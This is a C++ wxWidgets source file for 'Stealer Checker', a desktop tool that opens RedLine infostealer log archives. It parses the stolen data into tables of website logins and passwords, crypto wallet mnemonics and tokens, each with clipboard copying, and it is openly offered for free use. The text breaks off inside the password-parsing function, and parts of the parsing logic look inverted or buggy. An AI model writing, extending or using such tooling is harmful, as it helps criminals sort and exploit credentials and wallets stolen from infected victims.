#include "bitmaps.hpp"
#include "cjson.h"

#include <wx/wxprec.h>

#ifndef WX_PRECOMP
#include <wx/wx.h>
#endif

#include <mimaxue/mimaxue.hpp>

#include <wx/filehistory.h>

#include <wx/aboutdlg.h>

#include <wx/notebook.h>

#include <wx/treectrl.h>
#include <wx/listctrl.h>

#include <wx/wfstream.h>
#include <wx/mstream.h>
#include <wx/sstream.h>

#include <wx/clipbrd.h>

#include <wx/zipstrm.h>

#include <wx/file.h>

#include <thread>
#include <mutex>
#include <map>

std::mutex Mutex;

class Frame : public wxFrame
{
	enum OwnedID
	{
		ID_COPY1 = 1,
		ID_COPY2,
		ID_COPY3,
		RECENT_FILE_1,
		RECENT_FILE_2,
		RECENT_FILE_3,
		RECENT_FILE_4,
		RECENT_FILE_5,
		RECENT_FILE_6,
		RECENT_FILE_7,
		RECENT_FILE_8,
		RECENT_PROJECT_1,
		RECENT_PROJECT_2,
		RECENT_PROJECT_3,
		RECENT_PROJECT_4,
	};

public:
	Frame() : wxFrame(nullptr, wxID_ANY, "Stealer Checker")
	{
		Bind(wxEVT_MENU, [&](wxCommandEvent& Event)
		{
			switch (Event.GetId())
			{
			case ID_COPY1:
			{
				if (wxTheClipboard->Open())
				{
					wxString TheNextClipboardDataString;

					long LoginsListCtrlItemIndex = -1;
					while ((LoginsListCtrlItemIndex = LoginsListCtrl->GetNextItem(LoginsListCtrlItemIndex, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED)) != wxNOT_FOUND)
					{
						if (TheNextClipboardDataString.size() > 0)
						{
							TheNextClipboardDataString.append('\n');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 1));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 2));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 3));
						}
						else
						{
							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 1));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 2));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(LoginsListCtrl->GetItemText(LoginsListCtrlItemIndex, 3));
						}
					}

					wxTheClipboard->SetData(new wxTextDataObject(TheNextClipboardDataString));
					wxTheClipboard->Close();
				}

				break;
			}
			case ID_COPY2:
			{
				if (wxTheClipboard->Open())
				{
					wxString TheNextClipboardDataString;

					long WalletsListCtrlItemIndex = -1;
					while ((WalletsListCtrlItemIndex = WalletsListCtrl->GetNextItem(WalletsListCtrlItemIndex, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED)) != wxNOT_FOUND)
					{
						if (TheNextClipboardDataString.size() > 0)
						{
							TheNextClipboardDataString.append('\n');

							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 1));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 2));
						}
						else
						{
							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 1));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 2));
						}
					}

					wxTheClipboard->SetData(new wxTextDataObject(TheNextClipboardDataString));
					wxTheClipboard->Close();
				}

				break;
			}
			case ID_COPY3:
			{
				if (wxTheClipboard->Open())
				{
					wxString TheNextClipboardDataString;

					long TokensListCtrlItemIndex = -1;
					while ((TokensListCtrlItemIndex = TokensListCtrl->GetNextItem(TokensListCtrlItemIndex, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED)) != wxNOT_FOUND)
					{
						if (TheNextClipboardDataString.size() > 0)
						{
							TheNextClipboardDataString.append('\n');

							TheNextClipboardDataString.append(TokensListCtrl->GetItemText(TokensListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(TokensListCtrl->GetItemText(TokensListCtrlItemIndex, 1));
						}
						else
						{
							TheNextClipboardDataString.append(TokensListCtrl->GetItemText(TokensListCtrlItemIndex));
							TheNextClipboardDataString.append(' ');

							TheNextClipboardDataString.append(TokensListCtrl->GetItemText(TokensListCtrlItemIndex, 1));
						}
					}

					wxTheClipboard->SetData(new wxTextDataObject(TheNextClipboardDataString));
					wxTheClipboard->Close();
				}

				break;
			}
			case wxID_ADD:
			{
				wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "ZIP Archives (*.zip)|*.zip|All Files (*.*)|*.*", wxFD_OPEN | wxFD_FILE_MUST_EXIST | wxFD_MULTIPLE);

				if (FileDialog.ShowModal() == wxID_OK)
				{
					wxArrayString Paths;
					FileDialog.GetPaths(Paths);

					for (const wxString Path : Paths)
					{
						wxTreeItemId FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetRootItem(); wxTreeItemIdValue TreeItemIdValue;
						FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetFirstChild(FilesTreeCtrlCurrentItem, TreeItemIdValue);

						bool IsUniquePath = true;
						while (FilesTreeCtrlCurrentItem)
						{
							if (Path == FilesTreeCtrl->GetItemText(FilesTreeCtrlCurrentItem))
							{
								IsUniquePath = false;
								break;
							}

							FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetNextSibling(FilesTreeCtrlCurrentItem);
						}

						if (!IsUniquePath)
							continue;

						std::thread PathProcessingThread(&Frame::ProcessPath, this, Path);
						PathProcessingThread.detach();

						RecentFilesFileHistory->AddFileToHistory(Path);

						if (!MenuFileRecentFilesSubMenu->IsEnabled())
							MenuFileRecentFilesSubMenu->Enable(true);
					}
				}

				break;
			}
			case wxID_REMOVE:
			{
				const wxString Path = FilesTreeCtrl->GetItemText(FilesTreeCtrl->GetSelection());

				long LoginsListCtrlItem = 0;
				do
					LoginsListCtrlItem = LoginsListCtrl->FindItem(wxID_ANY, Path);
				while (LoginsListCtrl->DeleteItem(LoginsListCtrlItem));

				long WalletsListCtrlItem = 0;
				do
					WalletsListCtrlItem = WalletsListCtrl->FindItem(wxID_ANY, Path);
				while (WalletsListCtrl->DeleteItem(WalletsListCtrlItem));

				long TokensListCtrlItem = 0;
				do
					TokensListCtrlItem = TokensListCtrl->FindItem(wxID_ANY, Path);
				while (TokensListCtrl->DeleteItem(TokensListCtrlItem));

				FilesTreeCtrl->Delete(FilesTreeCtrl->GetSelection());

				break;
			}
			default:
				Event.Skip();
				break;
			}
		});

		RecentFilesFileHistory->SetMenuPathStyle(wxFH_PATH_SHOW_ALWAYS);
		RecentProjectsFileHistory->SetMenuPathStyle(wxFH_PATH_SHOW_ALWAYS);

		RecentFilesFileHistory->UseMenu(RecentFilesMenu);
		RecentProjectsFileHistory->UseMenu(RecentProjectsMenu);

		MenuFile->Append(wxID_NEW);
		MenuFile->Append(wxID_OPEN);
		MenuFile->AppendSeparator();
		MenuFile->Append(wxID_SAVE);
		MenuFile->Enable(wxID_SAVE, false);
		MenuFile->Append(wxID_SAVEAS);
		MenuFile->Enable(wxID_SAVEAS, false);
		MenuFile->AppendSeparator();
		MenuFileRecentFilesSubMenu = MenuFile->AppendSubMenu(RecentFilesMenu, "Recent Files");
		MenuFileRecentProjectsSubMenu = MenuFile->AppendSubMenu(RecentProjectsMenu, "Recent Projects");
		MenuFile->AppendSeparator();
		MenuFile->Append(wxID_EXIT);
		MenuHelp->Append(wxID_ABOUT);

		MenuBar->Append(MenuFile, "&File");
		MenuBar->Append(MenuHelp, "&Help");

		if (RecentFilesFileHistory->GetCount() == 0)
			MenuFileRecentFilesSubMenu->Enable(false);

		if (RecentProjectsFileHistory->GetCount() == 0)
			MenuFileRecentProjectsSubMenu->Enable(false);

		MenuBar->Bind(wxEVT_MENU, [&](wxCommandEvent& Event)
		{
			switch (Event.GetId())
			{
			case wxID_OPEN:
			{
				wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_OPEN | wxFD_FILE_MUST_EXIST);

				if (FileDialog.ShowModal() == wxID_OK)
				{
					ProjectPath = FileDialog.GetPath();
					OpenProject();
				}

				break;
			}
			case wxID_NEW:
			{
				if (ProjectPath != wxEmptyString)
				{
					bool SaveChanges = false;

					if (!wxFileExists(ProjectPath))
						SaveChanges = true;

					if (!SaveChanges)
					{
						wxFile File(ProjectPath, wxFile::OpenMode::read);
						char* FileData = new char[File.Length()]; File.Read(FileData, File.Length());
						cJSON* FileJSON = cJSON_Parse(FileData); delete[] FileData; File.Close();

						if (!SaveChanges)
						{
							cJSON* ProjectJSON = cJSON_CreateArray();

							wxTreeItemId FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetRootItem(); wxTreeItemIdValue TreeItemIdValue;
							FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetFirstChild(FilesTreeCtrlCurrentItem, TreeItemIdValue);

							while (FilesTreeCtrlCurrentItem)
							{
								cJSON_AddItemToArray(ProjectJSON, cJSON_CreateString(FilesTreeCtrl->GetItemText(FilesTreeCtrlCurrentItem)));
								FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetNextSibling(FilesTreeCtrlCurrentItem);
							}

							const wxString ProjectJSONPrint = cJSON_Print(ProjectJSON);
							const wxString FileJSONPrint = cJSON_Print(FileJSON);

							if (strcmp(ProjectJSONPrint, FileJSONPrint))
								SaveChanges = true;

							cJSON_Delete(ProjectJSON);
						}

						cJSON_Delete(FileJSON);
					}

					if (SaveChanges)
					{
						if (wxMessageBox(wxString::Format("Save Changes in %s?", ProjectPath), wxASCII_STR(wxMessageBoxCaptionStr), wxCENTRE | wxYES_NO | wxICON_WARNING) == wxYES)
							SaveProject();
					}
				}
				else if (FilesTreeCtrl->GetCount() > 0)
				{
					if (wxMessageBox("Save Changes in Unnamed Project?", wxASCII_STR(wxMessageBoxCaptionStr), wxCENTRE | wxYES_NO | wxICON_WARNING) == wxYES)
					{
						wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

						if (FileDialog.ShowModal() == wxID_OK)
						{
							ProjectPath = FileDialog.GetPath();
							SaveProject();
						}
					}
				}

				ProjectPath = wxEmptyString;

				FilesTreeCtrl->DeleteAllItems(); FilesTreeCtrlRoot = FilesTreeCtrl->AddRoot(wxEmptyString);
				LoginsListCtrl->DeleteAllItems(); WalletsListCtrl->DeleteAllItems(); TokensListCtrl->DeleteAllItems();

				SetLabel("Stealer Checker");

				break;
			}
			case wxID_SAVE:
			{
				if (ProjectPath.empty())
				{
					wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

					if (FileDialog.ShowModal() == wxID_OK)
						ProjectPath = FileDialog.GetPath();
					else
						return;
				}

				SaveProject();

				break;
			}
			case wxID_SAVEAS:
			{
				wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

				if (FileDialog.ShowModal() == wxID_OK)
				{
					ProjectPath = FileDialog.GetPath();
					SaveProject();
				}

				break;
			}
			case wxID_EXIT:
				Close(true);
				break;
			case wxID_ABOUT:
			{
				wxAboutDialogInfo AboutDialogInfo;

				AboutDialogInfo.SetName("Stealer Checker");
				AboutDialogInfo.SetDescription("Get information from RedLine logs");
				AboutDialogInfo.SetWebSite("https://github.com/r3ady4anyth1ng/Stealer-Checker", "Repository");
				AboutDialogInfo.SetLicence("This is free and unencumbered software released into the public domain.\n\nAnyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non - commercial, and by any means.\n\nIn jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at largeand to the detriment of our heirsand successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all presentand future rights to this software under copyright law.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\nFor more information, please refer to <https://unlicense.org>");

				wxAboutBox(AboutDialogInfo, this);

				break;
			}
			default:
				Event.Skip();
				break;
			}
		});

		SetMenuBar(MenuBar);

		ToolBarRemoveTool->Enable(false);
		ToolBar->Realize();

		FilesTreeCtrl->Connect(wxEVT_LEFT_DOWN, wxMouseEventHandler(Frame::OnCommandLeftClick), nullptr, this);
		FilesTreeCtrl->Connect(wxEVT_COMMAND_TREE_ITEM_MENU, wxMouseEventHandler(Frame::TreeItemMenu), nullptr, this);

		LoginsListCtrl->AppendColumn("File");
		LoginsListCtrl->AppendColumn("Link");
		LoginsListCtrl->AppendColumn("Username");
		LoginsListCtrl->AppendColumn("Password");

		WalletsListCtrl->AppendColumn("File");
		WalletsListCtrl->AppendColumn("Mnemonic");
		WalletsListCtrl->AppendColumn("Password");
		
		TokensListCtrl->AppendColumn("File");
		TokensListCtrl->AppendColumn("Token");

		Notebook->AddPage(FilesTreeCtrl, "Files");
		Notebook->AddPage(LoginsListCtrl, "Logins");
		Notebook->AddPage(WalletsListCtrl, "Wallets");
		Notebook->AddPage(TokensListCtrl, "Tokens");

		LoginsListCtrl->Bind(wxEVT_LIST_ITEM_RIGHT_CLICK, [&](wxListEvent& Event)
		{
			wxMenu Menu;

			Menu.Append(new wxMenuItem(&Menu, ID_COPY1, "Copy"));

			PopupMenu(&Menu);
		});

		WalletsListCtrl->Bind(wxEVT_LIST_ITEM_RIGHT_CLICK, [&](wxListEvent& Event)
		{
			wxMenu Menu;

			Menu.Append(new wxMenuItem(&Menu, ID_COPY2, "Copy"));

			PopupMenu(&Menu);
		});

		TokensListCtrl->Bind(wxEVT_LIST_ITEM_RIGHT_CLICK, [&](wxListEvent& Event)
		{
			wxMenu Menu;

			Menu.Append(new wxMenuItem(&Menu, ID_COPY3, "Copy"));

			PopupMenu(&Menu);
		});

		Centre();
	}

private:
	wxMenuBar* MenuBar = new wxMenuBar();
	wxMenu* MenuFile = new wxMenu(), *MenuHelp = new wxMenu(), *RecentFilesMenu = new wxMenu(), *RecentProjectsMenu = new wxMenu();

	wxFileHistory* RecentFilesFileHistory = new wxFileHistory(8, RECENT_FILE_1);
	wxFileHistory* RecentProjectsFileHistory = new wxFileHistory(4, RECENT_PROJECT_1);

	wxMenuItem* MenuFileRecentFilesSubMenu, *MenuFileRecentProjectsSubMenu;

	wxToolBar* ToolBar = CreateToolBar(wxTB_TEXT);
	wxToolBarToolBase* ToolBarAddTool = ToolBar->AddTool(wxID_ADD, "Add", wxBitmap(AddBitmap));
	wxToolBarToolBase* ToolBarRemoveTool = ToolBar->AddTool(wxID_REMOVE, "Remove", wxBitmap(RemoveBitmap));

	wxNotebook* Notebook = new wxNotebook(this, wxID_ANY);
	wxTreeCtrl* FilesTreeCtrl = new wxTreeCtrl(Notebook, 0, wxDefaultPosition, wxDefaultSize, wxTR_DEFAULT_STYLE | wxTR_SINGLE | wxTR_HIDE_ROOT);
	wxTreeItemId FilesTreeCtrlRoot = FilesTreeCtrl->AddRoot(wxEmptyString);

	wxListCtrl* LoginsListCtrl = new wxListCtrl(Notebook, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT), *WalletsListCtrl = new wxListCtrl(Notebook, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT), *TokensListCtrl = new wxListCtrl(Notebook, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxLC_REPORT);

	wxString ProjectPath = wxEmptyString;

	void OnRecentFile(wxCommandEvent& Event)
	{
		wxString RecentFilePath = RecentFilesMenu->GetLabelText(Event.GetId()).substr(3);

		if (!wxFileExists(RecentFilePath))
		{
			wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, /*"ZIP Archives (*.zip)|*.zip|RAR Archives (*.rar)|*.rar|TAR Archives (*.tar)|*.tar|CAB Archives (*.cab)|*.cab|All Files (*.*)|*.*"*/ "ZIP Archives (*.zip)|*.zip", wxFD_OPEN | wxFD_FILE_MUST_EXIST | wxFD_MULTIPLE);

			if (FileDialog.ShowModal() == wxID_OK)
				RecentFilePath = FileDialog.GetPath();
			else
				return;
		}

		wxTreeItemId FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetRootItem(); wxTreeItemIdValue TreeItemIdValue;
		FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetFirstChild(FilesTreeCtrlCurrentItem, TreeItemIdValue);

		bool IsUniquePath = true;
		while (FilesTreeCtrlCurrentItem)
		{
			if (RecentFilePath == FilesTreeCtrl->GetItemText(FilesTreeCtrlCurrentItem))
			{
				IsUniquePath = false;
				break;
			}

			FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetNextSibling(FilesTreeCtrlCurrentItem);
		}

		if (!IsUniquePath)
			return;

		std::thread PathProcessingThread(&Frame::ProcessPath, this, RecentFilePath);
		PathProcessingThread.detach();
	}

	void OnRecentProject(wxCommandEvent& Event)
	{
		ProjectPath = RecentProjectsMenu->GetLabelText(Event.GetId()).substr(3);
		OpenProject();
	}

	void OpenProject()
	{
		if (!wxFileExists(ProjectPath))
		{
			wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_OPEN | wxFD_FILE_MUST_EXIST);

			if (FileDialog.ShowModal() == wxID_OK)
				ProjectPath = FileDialog.GetPath();
			else
				return;
		}

		wxFile File(ProjectPath, wxFile::OpenMode::read);
		char* FileData = new char[File.Length()]; File.Read(FileData, File.Length());
		cJSON* FileJSON = cJSON_Parse(FileData); delete[] FileData; File.Close();

		FilesTreeCtrl->DeleteAllItems(); FilesTreeCtrlRoot = FilesTreeCtrl->AddRoot(wxEmptyString);
		LoginsListCtrl->DeleteAllItems(); WalletsListCtrl->DeleteAllItems(); TokensListCtrl->DeleteAllItems();

		const int FileJSONSize = cJSON_GetArraySize(FileJSON);
		for (int FileJSONIndex = 0; FileJSONIndex < FileJSONSize; FileJSONIndex++)
		{
			const cJSON* const FileJSONItem = cJSON_GetArrayItem(FileJSON, FileJSONIndex);

			std::thread PathProcessingThread(&Frame::ProcessPath, this, FileJSONItem->valuestring);
			PathProcessingThread.detach();

			RecentFilesFileHistory->AddFileToHistory(FileJSONItem->valuestring);

			if (!MenuFileRecentFilesSubMenu->IsEnabled())
				MenuFileRecentFilesSubMenu->Enable(true);
		}

		cJSON_Delete(FileJSON);

		SetLabel(wxString::Format("Stealer Checker — %s", ProjectPath));
		RecentProjectsFileHistory->AddFileToHistory(ProjectPath);

		if (!MenuFileRecentProjectsSubMenu->IsEnabled())
			MenuFileRecentProjectsSubMenu->Enable(true);
	}

	void SaveProject()
	{
		wxFile File(ProjectPath, wxFile::OpenMode::write);
		cJSON* FileJSON = cJSON_CreateArray();

		wxTreeItemId FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetRootItem(); wxTreeItemIdValue TreeItemIdValue;
		FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetFirstChild(FilesTreeCtrlCurrentItem, TreeItemIdValue);

		while (FilesTreeCtrlCurrentItem)
		{
			cJSON_AddItemToArray(FileJSON, cJSON_CreateString(FilesTreeCtrl->GetItemText(FilesTreeCtrlCurrentItem)));
			FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetNextSibling(FilesTreeCtrlCurrentItem);
		}

		File.Write(cJSON_Print(FileJSON)); File.Close(); cJSON_Delete(FileJSON);

		RecentProjectsFileHistory->AddFileToHistory(ProjectPath);

		if (!MenuFileRecentProjectsSubMenu->IsEnabled())
			MenuFileRecentProjectsSubMenu->Enable(true);

		SetLabel(wxString::Format("Stealer Checker — %s", ProjectPath));
	}

	void OnCommandLeftClick(wxMouseEvent& Event)
	{
		FilesTreeCtrl->UnselectAll();

		wxPoint MousePosition = Event.GetPosition();
		int HitTestOnItemLabel = wxTREE_HITTEST_ONITEMLABEL;

		Event.Skip();

		wxTreeItemId HitTestItemId = FilesTreeCtrl->HitTest(MousePosition, HitTestOnItemLabel);

		if (!HitTestItemId)
		{
			if (ToolBarRemoveTool->IsEnabled())
				ToolBar->EnableTool(ToolBarRemoveTool->GetId(), false);

			return;
		}

		wxTreeItemId CurrentFilesTreeCtrlItem = HitTestItemId;

		FilesTreeCtrl->SelectItem(CurrentFilesTreeCtrlItem);
		if (FilesTreeCtrl->GetItemParent(CurrentFilesTreeCtrlItem) != FilesTreeCtrl->GetRootItem())
		{
			if (ToolBarRemoveTool->IsEnabled())
				ToolBar->EnableTool(ToolBarRemoveTool->GetId(), false);

			return;
		}

		ToolBar->EnableTool(ToolBarRemoveTool->GetId(), true);

		Event.Skip();
	}

	void TreeItemMenu(wxMouseEvent& Event)
	{
		FilesTreeCtrl->UnselectAll();

		wxMenu Menu;

		wxTreeItemId CurrentFilesTreeCtrlItem = (*((wxTreeEvent*)&Event)).GetItem();

		FilesTreeCtrl->SelectItem(CurrentFilesTreeCtrlItem);

		if (FilesTreeCtrl->GetItemParent(CurrentFilesTreeCtrlItem) != FilesTreeCtrl->GetRootItem())
		{
			if (ToolBarRemoveTool->IsEnabled())
				ToolBar->EnableTool(ToolBarRemoveTool->GetId(), false);

			return;
		}

		if (!ToolBarRemoveTool->IsEnabled())
			ToolBar->EnableTool(ToolBarRemoveTool->GetId(), true);

		Menu.Append(new wxMenuItem(&Menu, wxID_REMOVE));

		PopupMenu(&Menu);
	}

	void OnCharHook(wxKeyEvent& Event)
	{
		if (Event.GetKeyCode() == wxKeyCode::WXK_DELETE || Event.GetKeyCode() == wxKeyCode::WXK_NUMPAD_DELETE)
		{
			if (FilesTreeCtrl->GetSelection() == nullptr)
				return;

			if (FilesTreeCtrl->GetItemParent(FilesTreeCtrl->GetSelection()) != FilesTreeCtrl->GetRootItem())
				return;

			const wxString Path = FilesTreeCtrl->GetItemText(FilesTreeCtrl->GetSelection());

			long LoginsListCtrlItem = 0;
			do
				LoginsListCtrlItem = LoginsListCtrl->FindItem(wxID_ANY, Path);
			while (LoginsListCtrl->DeleteItem(LoginsListCtrlItem));

			long WalletsListCtrlItem = 0;
			do
				WalletsListCtrlItem = WalletsListCtrl->FindItem(wxID_ANY, Path);
			while (WalletsListCtrl->DeleteItem(WalletsListCtrlItem));

			long TokensListCtrlItem = 0;
			do
				TokensListCtrlItem = TokensListCtrl->FindItem(wxID_ANY, Path);
			while (TokensListCtrl->DeleteItem(TokensListCtrlItem));

			FilesTreeCtrl->Delete(FilesTreeCtrl->GetSelection());
		}

		Event.Skip();
	}

	void OnClose(wxCloseEvent& Event)
	{
		if (ProjectPath != wxEmptyString)
		{
			bool SaveChanges = false;

			if (!wxFileExists(ProjectPath))
				SaveChanges = true;

			if (!SaveChanges)
			{
				wxFile File(ProjectPath, wxFile::OpenMode::read);
				char* FileData = new char[File.Length()]; File.Read(FileData, File.Length());
				cJSON* FileJSON = cJSON_Parse(FileData); delete[] FileData; File.Close();

				if (!SaveChanges)
				{
					cJSON* ProjectJSON = cJSON_CreateArray();

					wxTreeItemId FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetRootItem(); wxTreeItemIdValue TreeItemIdValue;
					FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetFirstChild(FilesTreeCtrlCurrentItem, TreeItemIdValue);

					while (FilesTreeCtrlCurrentItem)
					{
						cJSON_AddItemToArray(ProjectJSON, cJSON_CreateString(FilesTreeCtrl->GetItemText(FilesTreeCtrlCurrentItem)));
						FilesTreeCtrlCurrentItem = FilesTreeCtrl->GetNextSibling(FilesTreeCtrlCurrentItem);
					}

					const wxString ProjectJSONPrint = cJSON_Print(ProjectJSON);
					const wxString FileJSONPrint = cJSON_Print(FileJSON);

					if (strcmp(ProjectJSONPrint, FileJSONPrint))
						SaveChanges = true;

					cJSON_Delete(ProjectJSON);
				}

				cJSON_Delete(FileJSON);
			}

			if (SaveChanges)
			{
				if (wxMessageBox(wxString::Format("Save Changes in %s?", ProjectPath), wxASCII_STR(wxMessageBoxCaptionStr), wxCENTRE | wxYES_NO | wxICON_WARNING) == wxYES)
					SaveProject();
			}
		}
		else if (FilesTreeCtrl->GetCount() > 0)
		{
			if (wxMessageBox("Save Changes in Unnamed Project?", wxASCII_STR(wxMessageBoxCaptionStr), wxCENTRE | wxYES_NO | wxICON_WARNING) == wxYES)
			{
				wxFileDialog FileDialog(this, wxEmptyString, wxEmptyString, wxEmptyString, "Stealer Checker Project Files (*.scproj)|*.scproj|All Files (*.*)|*.*", wxFD_SAVE | wxFD_OVERWRITE_PROMPT);

				if (FileDialog.ShowModal() == wxID_OK)
				{
					ProjectPath = FileDialog.GetPath();
					SaveProject();
				}
			}
		}

		Destroy();
	}

	void ProcessPath(const wxString Path)
	{
		MenuFile->Enable(wxID_SAVE, true);
		MenuFile->Enable(wxID_SAVEAS, true);

		const wxTreeItemId AfterRootTreeItemId = FilesTreeCtrl->AppendItem(FilesTreeCtrlRoot, Path);
		wxTreeItemId CurrentTreeItemId = AfterRootTreeItemId;

		std::unique_ptr<wxZipEntry> ZipEntry;

		std::map<wxString, wxTreeItemId> TreeItemIdsMap;
		wxArrayString Autofills, Passwords, Vaults;

		wxFFileInputStream FileInputStream(Path);
		wxZipInputStream ZipInputStream(FileInputStream);

		while (ZipEntry.reset(ZipInputStream.GetNextEntry()), ZipEntry.get() != nullptr)
		{
			const wxString ZipEntryName = ZipEntry->GetName();
			wxString NextMutable = ZipEntryName;

			size_t NextPosition = 0;
			do
			{
				if (NextPosition)
				{
					wxString NextString = NextMutable.substr(0, NextPosition);
					NextMutable = NextMutable.substr(NextPosition + 1);

					if (TreeItemIdsMap.find(NextString) == TreeItemIdsMap.end())
						CurrentTreeItemId = TreeItemIdsMap[NextString] = FilesTreeCtrl->AppendItem(CurrentTreeItemId, NextString);
					else
						CurrentTreeItemId = TreeItemIdsMap[NextString];
				}

				NextPosition = NextMutable.find('\\');
			} while (NextPosition != wxString::npos);

			if (!NextMutable.IsEmpty())
			{
				FilesTreeCtrl->AppendItem(CurrentTreeItemId, NextMutable);

				if (!ZipEntryName.StartsWith("Autofills"))
				{
					wxMemoryOutputStream MemoryOutputStream(nullptr);
					ZipInputStream.Read(MemoryOutputStream);

					wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());

					NextPosition = MemoryOutputStreamString.find("Value: ");

					if (NextPosition != wxString::npos)
					{
						while (NextPosition != wxString::npos)
						{
							MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 7);
							const wxString Autofill = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find_first_of("\n\r"));

							bool IsUniqueAutofill = true;
							for (const wxString UniqueAutofill : Autofills)
							{
								if (Autofill == UniqueAutofill && IsUniqueAutofill)
								{
									IsUniqueAutofill = false;
									break;
								}
							}

							if (IsUniqueAutofill)
								Autofills.push_back(Autofill);

							NextPosition = MemoryOutputStreamString.find("Value: ");
						}
					}
				}
				else if (!ZipEntryName.compare("Passwords.txt"))
				{
					wxMemoryOutputStream MemoryOutputStream(nullptr);
					ZipInputStream.Read(MemoryOutputStream);

					wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());

					NextPosition = MemoryOutputStreamString.find("URL: ");

					if (NextPosition != wxString::npos)
					{
						while (NextPosition != wxString::npos)
						{
							MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 5);

							Mutex.lock();
							long NextTokensListCtrlIndex = LoginsListCtrl->InsertItem(LoginsListCtrl->GetItemCount(), Path);
							Mutex.unlock();

							LoginsListCtrl->SetItem(NextTokensListCtrlIndex, 1, MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find_first_of("\n\r")));
							NextPosition = MemoryOutputStreamString.find("Username: ");
							MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 10);
							LoginsListCtrl->SetItem(NextTokensListCtrlIndex, 2, MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find_first_of("\n\r")));
							NextPosition = MemoryOutputStreamString.find("Password: ");
							MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 10);
